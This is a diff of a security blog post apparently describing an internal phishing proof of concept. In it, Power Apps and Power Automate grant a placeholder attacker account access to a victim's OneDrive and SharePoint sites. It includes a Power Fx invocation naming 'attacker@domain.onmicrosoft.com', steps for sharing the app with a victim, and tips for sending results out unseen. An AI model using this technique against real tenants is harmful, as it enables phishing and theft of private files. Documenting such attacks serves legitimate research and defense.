@@ -2,7 +2,7 @@
 layout: post
 title: M365 Internal Phish | Abusing SharePoint and OneDrive API with Power Apps and Power Automate
 description: >-
-    An internal phishing POC leveraging Microsoft 365 citizen development tools (Power Platform). Subtly gain access to a target user's OneDrive / SharePoint sites they own. A YouTube video of the POC can be found here: https://youtu.be/xXqFhN4wyGY
+    An internal phishing POC leveraging Microsoft 365 citizen development tools (Power Platform). Subtly gain access to a target user's OneDrive / SharePoint sites they own. A YouTube video of the POC v1 can be found here: https://youtu.be/xXqFhN4wyGY
 tags: Microsoft PowerApps Power-Automate SharePoint OneDrive Phishing M365 POC Cloud Hacking Privilege-Escalation
 toc: true
 published: true
@@ -67,11 +67,7 @@ which expands to the following
 > - The site enumeration part of this POC leverages the SharePoint search API and does NOT paginate results. To find all sites, this section should be modified.
 > - An action can be appended to the end of the workflow to output all sites that you have been granted permissions to, perhaps by `SharePoint | Create Action` in a public SharePoint list (don't forget to disable indexing so it won't be found through SharePoint search), Email `Outlook | Send an Email`, or other similar methods. 
 
-As mentioned above, I have posted a [YouTube POC](https://youtu.be/xXqFhN4wyGY).
-
-The .zip file attached is a flow that can be imported for your testing convenience.
-
-My decision to update the attacker parameter in the workflow instead of passing it as a parameter in the PowerApp is in case part of the social engineering results in granting Edit access to the app, at least the victim would not see a hardcoded parameter. Either way, the details can be updated for each use case.
+As mentioned above, I have posted a [YouTube POC](https://youtu.be/xXqFhN4wyGY). The POC in the video is a bit different than the one shown below, so keep that in mind if you try this yourself. 
 
 ### Steps
 
@@ -94,9 +90,11 @@ My decision to update the attacker parameter in the workflow instead of passing 
 
 2. Create a Power App that calls the workflow OnStart with the following parameters. The parameters for the function are (1) the victim's email, (2) the domain of the tenant (this can be hardcoded, my quick attempt at regex will probably not work in all environments) (3) attacker email (**update this**).
 
-```bash
-'POC-M365Phish'.Run(User().Email, First(MatchAll(User().Email, "(?<=@)[^.]+(?=\.)")).FullMatch, "attacker@domain.onmicrosoft.com")
-```
+    ```bash
+    'POC-M365Phish'.Run(User().Email, First(MatchAll(User().Email, "(?<=@)[^.]+(?=\.)")).FullMatch, "attacker@domain.onmicrosoft.com")
+    ```
+
+    [![](/assets/posts/2022/2022-05-13-Abusing-SharePoint-and-OneDrive-Permissions-with-PowerApps-and-Flow/20220512232924.png)](/assets/posts/2022/2022-05-13-Abusing-SharePoint-and-OneDrive-Permissions-with-PowerApps-and-Flow/20220512232924.png)  
 
 3. Share the app with a victim user 
 
